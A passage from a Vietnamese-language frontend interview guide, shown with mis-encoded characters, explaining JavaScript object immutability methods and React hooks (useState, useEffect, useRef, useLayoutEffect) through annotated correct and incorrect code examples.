    city: 'HCM',
  },
});

// Object.seal() - Prevent adding/removing properties
const sealedObject = Object.seal({
  name: 'John',
  age: 30,
});

// sealedObject.name = 'Jane'; // OK
// sealedObject.city = 'HCM'; // Error in strict mode
// delete sealedObject.age; // Error in strict mode

// Object.preventExtensions() - Prevent adding properties
const nonExtensibleObject = Object.preventExtensions({
  name: 'John',
  age: 30,
});

// nonExtensibleObject.name = 'Jane'; // OK
// nonExtensibleObject.city = 'HCM'; // Error in strict mode
// delete nonExtensibleObject.age; // OK

// Property descriptors
const obj = { name: 'John' };

Object.defineProperty(obj, 'age', {
  value: 30,
  writable: false,
  enumerable: true,
  configurable: false,
});

// obj.age = 40; // Error in strict mode
// delete obj.age; // Error in strict mode

// Get property descriptor
const descriptor = Object.getOwnPropertyDescriptor(obj, 'age');
console.log(descriptor); // { value: 30, writable: false, enumerable: true, configurable: false }

// Object.getOwnPropertyNames() vs Object.keys()
const obj = { a: 1, b: 2 };
Object.defineProperty(obj, 'c', {
  value: 3,
  enumerable: false,
});

console.log(Object.keys(obj)); // ['a', 'b']
console.log(Object.getOwnPropertyNames(obj)); // ['a', 'b', 'c']

// hasOwnProperty vs in operator
const obj = { a: 1 };
console.log(obj.hasOwnProperty('a')); // true
console.log('a' in obj); // true
console.log(obj.hasOwnProperty('toString')); // false
console.log('toString' in obj); // true

// Practical examples
function createImmutableObject(data: any): any {
  return Object.freeze(
    Object.keys(data).reduce((acc, key) => {
      acc[key] =
        typeof data[key] === 'object' ? deepFreeze(data[key]) : data[key];
      return acc;
    }, {} as any)
  );
}

function createMixin(...mixins: any[]): any {
  return function (target: any): any {
    mixins.forEach((mixin) => {
      Object.getOwnPropertyNames(mixin).forEach((name) => {
        if (name !== 'constructor') {
          target[name] = mixin[name];
        }
      });
    });
    return target;
  };
}

// Usage
const withLogging = createMixin({
  log(message: string): void {
    console.log(`${this.name}: ${message}`);
  },
});

function User(name: string) {
  this.name = name;
}

withLogging(User.prototype);

const user = new User('John');
user.log('Hello'); // "John: Hello"
```

**Best Practices - Combined:**

- **Array Methods**: Sá»­ dá»¥ng flat() cho nested arrays, flatMap() cho map vÃ  flatten
- **Object Methods**: Sá»­ dá»¥ng Object.entries() cho iteration, Object.assign() cho merging
- **Prototype**: Sá»­ dá»¥ng Object.create() cho prototype-based inheritance
- **Mixins**: Sá»­ dá»¥ng mixins cho functionality sharing
- **Immutability**: Sá»­ dá»¥ng Object.freeze() cho immutability, Object.seal() cho controlled mutability
- **Property Descriptors**: Sá»­ dá»¥ng proper property descriptors cho fine-grained control

**Mistakes - Object Concepts:**

```typescript
// âŒ Sai: KhÃ´ng hiá»ƒu shallow vs deep freeze
const obj = Object.freeze({ a: { b: 1 } });
obj.a.b = 2; // Still works!

// âœ… ÄÃºng: Deep freeze
const obj = deepFreeze({ a: { b: 1 } });
obj.a.b = 2; // Error in strict mode
```

---
</details>


<details>
<summary><span style="font-size:1.25em;font-weight:bold;">âš›ï¸ Q35: React Hooks & Advanced Patterns - Lifecycle, Performance, Architecture</span></summary>


**Tráº£ lá»i:**

CÃ¢u há»i nÃ y bao gá»“m táº¥t cáº£ kiáº¿n thá»©c quan trá»ng vá» React tá»« cÆ¡ báº£n Ä‘áº¿n nÃ¢ng cao, bao gá»“m:
- Táº¥t cáº£ React Hooks (useState, useEffect, useRef, useReducer, useContext, useMemo, useCallback, useLayoutEffect, useImperativeHandle, useSyncExternalStore)
- Lifecycle cá»§a Class Component vs Functional Component
- Virtual DOM, Reconciliation, key trong lists
- Performance optimization (React.memo, PureComponent)
- Advanced patterns (HOC, Render Props, Compound Components)
- React 18+ features (Suspense, Server Components, Concurrent Rendering, useTransition, useDeferredValue)
- React Router, Portal, Batching, Code Splitting

#### **ğŸ“š PHáº¦N 1: REACT HOOKS - Táº¤T Cáº¢ CÃC HOOK CÆ  Báº¢N & NÃ‚NG CAO**

---

##### **1.1. useState - State Management Hook**

**ğŸ¯ Má»¥c Ä‘Ã­ch:**
Quáº£n lÃ½ state trong functional component (trÆ°á»›c Ä‘Ã¢y chá»‰ cÃ³ class component má»›i cÃ³ state).

**ğŸ“– CÃ¡ch hoáº¡t Ä‘á»™ng:**
```typescript
const [state, setState] = useState(initialValue);

// CÃ¡ch hoáº¡t Ä‘á»™ng bÃªn trong React:
// 1. Láº§n render Ä‘áº§u tiÃªn: React táº¡o má»™t "fiber node" cho component
// 2. useState táº¡o má»™t "hook object" vá»›i giÃ¡ trá»‹ initial
// 3. Hook object Ä‘Æ°á»£c lÆ°u trong linked list trÃªn fiber node
// 4. setState trigger re-render báº±ng cÃ¡ch Ä‘Ã¡nh dáº¥u fiber "dirty"
// 5. Reconciliation: React so sÃ¡nh old state vs new state
// 6. Náº¿u khÃ¡c (Object.is comparison) â†’ re-render component
```

**ğŸ’¡ Chi tiáº¿t ká»¹ thuáº­t:**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// BASIC USAGE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function Counter() {
  const [count, setCount] = useState(0); // Primitive state
  
  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={() => setCount(count + 1)}>Increment</button>
    </div>
  );
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// FUNCTIONAL UPDATES (Quan trá»ng cho async updates)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function Counter() {
  const [count, setCount] = useState(0);
  
  // âŒ Sai: CÃ³ thá»ƒ bá»‹ stale closure khi gá»i nhiá»u láº§n
  const handleClick = () => {
    setCount(count + 1);
    setCount(count + 1); // Chá»‰ tÄƒng 1 láº§n vÃ¬ count cÅ©!
  };
  
  // âœ… ÄÃºng: LuÃ´n dÃ¹ng giÃ¡ trá»‹ má»›i nháº¥t
  const handleClickCorrect = () => {
    setCount(prev => prev + 1);
    setCount(prev => prev + 1); // TÄƒng 2 láº§n Ä‘Ãºng!
  };
  
  return <button onClick={handleClickCorrect}>Increment Twice</button>;
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// LAZY INITIALIZATION (Tá»‘i Æ°u performance)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function ExpensiveComponent() {
  // âŒ Sai: Cháº¡y expensive function má»—i láº§n re-render
  const [data, setData] = useState(expensiveComputation());
  
  // âœ… ÄÃºng: Chá»‰ cháº¡y 1 láº§n khi mount
  const [data, setData] = useState(() => expensiveComputation());
  
  return <div>{data}</div>;
}

function expensiveComputation() {
  console.log('Computing...'); // Chá»‰ log 1 láº§n vá»›i lazy init
  let result = 0;
  for (let i = 0; i < 1000000; i++) {
    result += i;
  }
  return result;
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// OBJECT/ARRAY STATE (Immutability pattern)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function UserForm() {
  const [user, setUser] = useState({
    name: '',
    email: '',
    address: { city: '', street: '' }
  });
  
  // âŒ Sai: Mutate trá»±c tiáº¿p (React khÃ´ng detect change)
  const handleChangeBad = (e) => {
    user.name = e.target.value; // Mutation!
    setUser(user); // React khÃ´ng re-render vÃ¬ cÃ¹ng reference
  };
  
  // âœ… ÄÃºng: Táº¡o object má»›i (immutable update)
  const handleChange = (e) => {
    setUser(prev => ({
      ...prev,
      [e.target.name]: e.target.value
    }));
  };
  
  // âœ… Nested object update
  const handleAddressChange = (field, value) => {
    setUser(prev => ({
      ...prev,
      address: {
        ...prev.address,
        [field]: value
      }
    }));
  };
  
  return (
    <form>
      <input name="name" onChange={handleChange} />
      <input name="email" onChange={handleChange} />
      <input 
        name="city" 
        onChange={(e) => handleAddressChange('city', e.target.value)} 
      />
    </form>
  );
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ARRAY STATE OPERATIONS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function TodoList() {
  const [todos, setTodos] = useState([
    { id: 1, text: 'Learn React', done: false }
  ]);
  
  // ThÃªm item
  const addTodo = (text) => {
    setTodos(prev => [...prev, { id: Date.now(), text, done: false }]);
  };
  
  // XÃ³a item
  const removeTodo = (id) => {
    setTodos(prev => prev.filter(todo => todo.id !== id));
  };
  
  // Update item
  const toggleTodo = (id) => {
    setTodos(prev => prev.map(todo => 
      todo.id === id ? { ...todo, done: !todo.done } : todo
    ));
  };
  
  // Insert at position
  const insertAt = (index, text) => {
    setTodos(prev => [
      ...prev.slice(0, index),
      { id: Date.now(), text, done: false },
      ...prev.slice(index)
    ]);
  };
  
  return (
    <ul>
      {todos.map(todo => (
        <li key={todo.id}>
          <input 
            type="checkbox" 
            checked={todo.done}
            onChange={() => toggleTodo(todo.id)}
          />
          {todo.text}
          <button onClick={() => removeTodo(todo.id)}>Delete</button>
        </li>
      ))}
    </ul>
  );
}
```

**âš ï¸ Common Mistakes:**

```typescript
// âŒ 1. KhÃ´ng dÃ¹ng functional update khi cáº§n previous state
const [count, setCount] = useState(0);
setCount(count + 1); // Stale closure issue

// âœ… Fix
setCount(prev => prev + 1);

// âŒ 2. Mutate state trá»±c tiáº¿p
const [arr, setArr] = useState([1, 2, 3]);
arr.push(4); // Mutation!
setArr(arr); // KhÃ´ng re-render

// âœ… Fix
setArr(prev => [...prev, 4]);

// âŒ 3. Set state trong render (infinite loop)
function Component() {
  const [count, setCount] = useState(0);
  setCount(1); // âŒ Infinite loop!
  return <div>{count}</div>;
}

// âœ… Fix: Set state trong event handler hoáº·c useEffect
useEffect(() => {
  setCount(1);
}, []);
```

---

##### **1.2. useEffect - Side Effects Hook**

**ğŸ¯ Má»¥c Ä‘Ã­ch:**
Xá»­ lÃ½ side effects (API calls, subscriptions, DOM manipulation, timers) trong functional components.

**ğŸ“– CÃ¡ch hoáº¡t Ä‘á»™ng:**
```typescript
useEffect(() => {
  // Effect function (cháº¡y sau render)
  return () => {
    // Cleanup function (cháº¡y trÆ°á»›c khi component unmount hoáº·c effect re-run)
  };
}, [dependencies]); // Dependency array

// Timeline:
// 1. Component render (JSX â†’ Virtual DOM)
// 2. React commit changes to real DOM
// 3. Browser paint screen
// 4. useEffect callback cháº¡y (AFTER paint - khÃ´ng block UI)
// 5. Khi dependencies thay Ä‘á»•i:
//    - Cleanup function cháº¡y trÆ°á»›c
//    - Effect function cháº¡y láº¡i
// 6. Khi component unmount: Cleanup cháº¡y cuá»‘i cÃ¹ng
```

**ğŸ’¡ Chi tiáº¿t ká»¹ thuáº­t:**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// useEffect COVERS CÃC LIFECYCLE NÃ€O?
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// Class component lifecycle:
class ClassComponent extends React.Component {
  componentDidMount() {
    // Cháº¡y 1 láº§n sau mount
  }
  
  componentDidUpdate(prevProps, prevState) {
    // Cháº¡y má»—i khi props/state thay Ä‘á»•i
  }
  
  componentWillUnmount() {
    // Cleanup trÆ°á»›c khi unmount
  }
}

// Functional component equivalent:
function FunctionalComponent() {
  // âœ… componentDidMount + componentWillUnmount
  useEffect(() => {
    console.log('Mounted');
    return () => console.log('Unmounted'); // cleanup
  }, []); // Empty deps = chá»‰ cháº¡y 1 láº§n
  
  // âœ… componentDidUpdate (khi count thay Ä‘á»•i)
  useEffect(() => {
    console.log('Count changed:', count);
  }, [count]); // Cháº¡y khi count thay Ä‘á»•i
  
  // âœ… componentDidMount + componentDidUpdate (má»—i láº§n render)
  useEffect(() => {
    console.log('Every render');
  }); // No deps = cháº¡y má»—i láº§n render
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// DEPENDENCY ARRAY RULES
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function Example({ userId }) {
  const [user, setUser] = useState(null);
  
  // âŒ Sai: Missing dependency
  useEffect(() => {
    fetchUser(userId).then(setUser); // userId khÃ´ng cÃ³ trong deps!
  }, []); // ESLint sáº½ warning
  
  // âœ… ÄÃºng: Include all dependencies
  useEffect(() => {
    fetchUser(userId).then(setUser);
  }, [userId]); // Re-fetch khi userId thay Ä‘á»•i
  
  // âœ… Ignore ESLint (náº¿u cháº¯c cháº¯n khÃ´ng cáº§n)
  useEffect(() => {
    fetchUser(userId).then(setUser);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []); // Chá»‰ fetch 1 láº§n (nhÆ°ng cÃ³ thá»ƒ stale)
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// CLEANUP FUNCTION - KHI NÃ€O CHáº Y?
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function Timer() {
  const [count, setCount] = useState(0);
  
  useEffect(() => {
    console.log('Effect running');
    const timer = setInterval(() => {
      setCount(prev => prev + 1);
    }, 1000);
    
    // Cleanup cháº¡y khi:
    // 1. Component unmount
    // 2. TrÆ°á»›c khi effect cháº¡y láº¡i (náº¿u deps thay Ä‘á»•i)
    return () => {
      console.log('Cleanup running');
      clearInterval(timer); // âš ï¸ Quan trá»ng: trÃ¡nh memory leak!
    };
  }, []); // Empty deps = cleanup chá»‰ cháº¡y khi unmount
  
  return <div>{count}</div>;
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// REAL-WORLD EXAMPLES
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// 1. Data Fetching
function UserProfile({ userId }) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  
  useEffect(() => {
    let cancelled = false; // Prevent setting state on unmounted component
    
    const fetchUser = async () => {
      try {
        setLoading(true);
        setError(null);
        const response = await fetch(`/api/users/${userId}`);
        const data = await response.json();
        
        if (!cancelled) {
          setUser(data);
        }
      } catch (err) {
        if (!cancelled) {
          setError(err.message);
        }
      } finally {
        if (!cancelled) {
          setLoading(false);
        }
      }
    };
    
    fetchUser();
    
    return () => {
      cancelled = true; // Cleanup: mark as cancelled
    };
  }, [userId]);
  
  if (loading) return <div>Loading...</div>;
  if (error) return <div>Error: {error}</div>;
  return <div>{user?.name}</div>;
}

// 2. Event Listeners
function WindowSize() {
  const [size, setSize] = useState({ width: 0, height: 0 });
  
  useEffect(() => {
    const handleResize = () => {
      setSize({
        width: window.innerWidth,
        height: window.innerHeight
      });
    };
    
    // Add listener
    window.addEventListener('resize', handleResize);
    handleResize(); // Set initial size
    
    // Cleanup: Remove listener
    return () => {
      window.removeEventListener('resize', handleResize);
    };
  }, []); // No deps = setup once
  
  return <div>{size.width} x {size.height}</div>;
}

// 3. Subscriptions (WebSocket, EventEmitter)
function ChatRoom({ roomId }) {
  const [messages, setMessages] = useState([]);
  
  useEffect(() => {
    const socket = new WebSocket(`ws://chat.com/${roomId}`);
    
    socket.onmessage = (event) => {
      setMessages(prev => [...prev, JSON.parse(event.data)]);
    };
    
    // Cleanup: Close connection
    return () => {
      socket.close();
    };
  }, [roomId]); // Re-connect khi Ä‘á»•i room
  
  return (
    <ul>
      {messages.map((msg, i) => <li key={i}>{msg.text}</li>)}
    </ul>
  );
}

// 4. Document Title
function PageTitle({ title }) {
  useEffect(() => {
    const prevTitle = document.title;
    document.title = title;
    
    return () => {
      document.title = prevTitle; // Restore
    };
  }, [title]);
}

// 5. Local Storage Sync
function useSyncWithLocalStorage(key, value) {
  useEffect(() => {
    localStorage.setItem(key, JSON.stringify(value));
  }, [key, value]);
}

function Settings() {
  const [theme, setTheme] = useState('light');
  useSyncWithLocalStorage('theme', theme);
  
  return <button onClick={() => setTheme('dark')}>Dark Mode</button>;
}
```

**âš ï¸ Common Mistakes:**

```typescript
// âŒ 1. KhÃ´ng cleanup subscriptions/timers
useEffect(() => {
  const timer = setInterval(() => {}, 1000);
  // âŒ Missing cleanup â†’ memory leak
}, []);

// âœ… Fix
useEffect(() => {
  const timer = setInterval(() => {}, 1000);
  return () => clearInterval(timer);
}, []);

// âŒ 2. Infinite loop (missing deps hoáº·c deps sai)
useEffect(() => {
  setCount(count + 1); // âŒ count thay Ä‘á»•i â†’ effect cháº¡y láº¡i â†’ count thay Ä‘á»•i...
}, [count]);

// âœ… Fix: KhÃ´ng set state cá»§a chÃ­nh dependency
useEffect(() => {
  // Fetch data based on count, khÃ´ng set count
}, [count]);

// âŒ 3. Async function trá»±c tiáº¿p trong useEffect
useEffect(async () => { // âŒ Error: useEffect khÃ´ng nháº­n async function
  const data = await fetchData();
}, []);

// âœ… Fix: Táº¡o async function bÃªn trong
useEffect(() => {
  const fetchData = async () => {
    const data = await fetch('/api');
  };
  fetchData();
}, []);

// âŒ 4. Race condition (fetch data)
useEffect(() => {
  fetchUser(userId).then(setUser); // âŒ Náº¿u userId Ä‘á»•i nhanh, response cÅ© cÃ³ thá»ƒ vá» sau
}, [userId]);

// âœ… Fix: Use cleanup Ä‘á»ƒ ignore stale responses
useEffect(() => {
  let cancelled = false;
  fetchUser(userId).then(data => {
    if (!cancelled) setUser(data);
  });
  return () => { cancelled = true; };
}, [userId]);
```

---

##### **1.3. useRef - Mutable Reference Hook**

**ğŸ¯ Má»¥c Ä‘Ã­ch:**
1. Access DOM elements trá»±c tiáº¿p
2. LÆ°u giÃ¡ trá»‹ mutable khÃ´ng trigger re-render
3. LÆ°u previous value cá»§a state/props

**ğŸ“– useRef vs useState:**

```typescript
// useState: Trigger re-render khi thay Ä‘á»•i
const [count, setCount] = useState(0);
setCount(1); // â†’ Component re-render

// useRef: KHÃ”NG trigger re-render
const countRef = useRef(0);
countRef.current = 1; // â†’ Component KHÃ”NG re-render

// Timeline:
// useState: Change state â†’ Schedule re-render â†’ Re-render â†’ Paint
// useRef: Change ref.current â†’ (Nothing happens, no re-render)
```

**ğŸ’¡ Chi tiáº¿t ká»¹ thuáº­t:**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// 1. DOM ACCESS (Primary use case)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function AutoFocusInput() {
  const inputRef = useRef<HTMLInputElement>(null);
  
  useEffect(() => {
    // Access DOM node directly
    inputRef.current?.focus();
  }, []);
  
  return <input ref={inputRef} />;
}

// Complex DOM manipulation
function VideoPlayer() {
  const videoRef = useRef<HTMLVideoElement>(null);
  
  const play = () => videoRef.current?.play();
  const pause = () => videoRef.current?.pause();
  const seek = (time: number) => {
    if (videoRef.current) {
      videoRef.current.currentTime = time;
    }
  };
  
  return (
    <>
      <video ref={videoRef} src="/video.mp4" />
      <button onClick={play}>Play</button>
      <button onClick={pause}>Pause</button>
      <button onClick={() => seek(10)}>Seek to 10s</button>
    </>
  );
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// 2. PERSIST VALUES ACROSS RENDERS (khÃ´ng trigger re-render)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function Timer() {
  const [count, setCount] = useState(0);
  const intervalRef = useRef<number>(null);
  
  const start = () => {
    // LÆ°u interval ID Ä‘á»ƒ clear sau nÃ y
    intervalRef.current = setInterval(() => {
      setCount(prev => prev + 1);
    }, 1000);
  };
  
  const stop = () => {
    if (intervalRef.current) {
      clearInterval(intervalRef.current);
    }
  };
  
  useEffect(() => {
    return () => stop(); // Cleanup
  }, []);
  
  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={start}>Start</button>
      <button onClick={stop}>Stop</button>
    </div>
  );
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// 3. TRACK PREVIOUS VALUE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function usePrevious<T>(value: T): T | undefined {
  const ref = useRef<T>();
  
  useEffect(() => {
    ref.current = value; // Update ref AFTER render
  });
  
  return ref.current; // Return PREVIOUS value (before update)
}

function Counter() {
  const [count, setCount] = useState(0);
  const prevCount = usePrevious(count);
  
  return (
    <div>
      <p>Current: {count}</p>
      <p>Previous: {prevCount}</p>
      <button onClick={() => setCount(count + 1)}>Increment</button>
    </div>
  );
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// 4. AVOID RE-RENDERS (Performance optimization)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function ClickTracker() {
  const [renderCount, setRenderCount] = useState(0);
  const clickCountRef = useRef(0); // KhÃ´ng trigger re-render
  
  const handleClick = () => {
    clickCountRef.current++; // Update ref (no re-render)
    console.log('Clicks:', clickCountRef.current);
    
    // Force re-render Ä‘á»ƒ show UI
    setRenderCount(prev => prev + 1);
  };
  
  return (
    <div>
      <p>Renders: {renderCount}</p>
      <p>Clicks: {clickCountRef.current}</p>
      <button onClick={handleClick}>Click</button>
    </div>
  );
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// 5. CALLBACK REF (Advanced)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

function MeasureElement() {
  const [height, setHeight] = useState(0);
  
  // Callback ref: Ä‘Æ°á»£c gá»i khi element mount/unmount
  const measureRef = useCallback((node: HTMLDivElement | null) => {
    if (node !== null) {
      setHeight(node.getBoundingClientRect().height);
    }
  }, []);
  
  return (
    <>
      <div ref={measureRef}>
        <p>Measure me!</p>
      </div>
      <p>Height: {height}px</p>
    </>
  );
}
```

**âš ï¸ Common Mistakes:**

```typescript
// âŒ 1. Expect re-render khi thay Ä‘á»•i ref
const countRef = useRef(0);
countRef.current++;
// âŒ Component khÃ´ng re-render â†’ UI khÃ´ng update

// âœ… Fix: DÃ¹ng useState náº¿u cáº§n re-render
const [count, setCount] = useState(0);

// âŒ 2. Mutate ref.current trong render
function Component() {
  const ref = useRef(0);
  ref.current++; // âŒ Side effect trong render!
  return <div>{ref.current}</div>;
}

// âœ… Fix: Update trong useEffect hoáº·c event handler
useEffect(() => {
  ref.current++;
}, []);

// âŒ 3. KhÃ´ng check null khi access DOM
const inputRef = useRef<HTMLInputElement>(null);
inputRef.current.focus(); // âŒ CÃ³ thá»ƒ null!

// âœ… Fix: Check null hoáº·c dÃ¹ng optional chaining
inputRef.current?.focus();
```

---

##### **1.4. useLayoutEffect - Synchronous Effect Hook**

**ğŸ¯ Má»¥c Ä‘Ã­ch:**
Cháº¡y effect TRÆ¯á»šC KHI browser paint (synchronous), dÃ¹ng cho DOM measurements hoáº·c mutations cáº§n xáº£y ra trÆ°á»›c khi user tháº¥y UI.

**ğŸ“– useEffect vs useLayoutEffect Timeline:**

```typescript
// useEffect:
// 1. React renders component (Virtual DOM)
// 2. React commits to real DOM
// 3. Browser PAINTS screen (user tháº¥y UI)
// 4. useEffect runs (AFTER paint - khÃ´ng block UI)

// useLayoutEffect:
// 1. React renders component
// 2. React commits to real DOM
// 3. useLayoutEffect runs (BEFORE paint - BLOCKS UI)
// 4. Browser paints (user tháº¥y UI Ä‘Ã£ updated)
```

**ğŸ’¡ Chi tiáº¿t ká»¹ thuáº­t:**

```typescript
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// KHI NÃ€O DÃ™NG useLayoutEffect?
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// âœ… Use case 1: DOM measurements (avoid flicker)
function Tooltip() {
  const [tooltip, setTooltip] = useState({ x: 0, y: 0 });
  const buttonRef = useRef<HTMLButtonElement>(null);
  
  // âŒ useEffect: User tháº¥y tooltip nháº£y vÃ¬ cháº¡y SAU paint
  useEffect(() => {
    const rect = buttonRef.current?.getBoundingClientRect();
    setTooltip({ x: rect.left, y: rect.bottom });
  }, []);
  
  // âœ… useLayoutEffect: Tooltip Ä‘Ãºng vá»‹ trÃ­ ngay tá»« Ä‘áº§u
  useLayoutEffect(() => {
    const rect = buttonRef.current?.getBoundingClientRect();
    setTooltip({ x: rect.left, y: rect.bottom });
  }, []);
  
  return (
    <>
      <button ref={buttonRef}>Hover me</button>
      <div style={{ position: 'absolute', left: tooltip.x, top: tooltip.y }}>
        Tooltip
      </div>
    </>
  );
}

// âœ… Use case 2: Scroll position (avoid jump)
function RestoreScroll() {
  const contentRef = useRef<HTMLDivElement>(null);
  
  useLayoutEffect(() => {
    // Restore scroll TRÆ¯á»šC khi paint â†’ no visual jump
    const savedScroll = localStorage.getItem('scrollPos');
    if (savedScroll && contentRef.current) {
      contentRef.current.scrollTop = parseInt(savedScroll);
    }
  }, []);
  
  useEffect(() => {
    const handleScroll = () => {
      if (contentRef.current) {
        localStorage.setItem('scrollPos', contentRef.current.scrollTop.toString());
      }
    };
    
    contentRef.current?.addEventListener('scroll', handleScroll);
    return () => contentRef.current?.removeEventListener('scroll', handleScroll);
  }, []);
  
  return <div ref={contentRef} style={{ height: 400, overflow: 'auto' }}>
    {/* Long content */}
  </div>;
}

// âœ… Use case 3: Animate before paint
function AnimatedBox() {
  const boxRef = useRef<HTMLDivElement>(null);
  
  useLayoutEffect(() => {
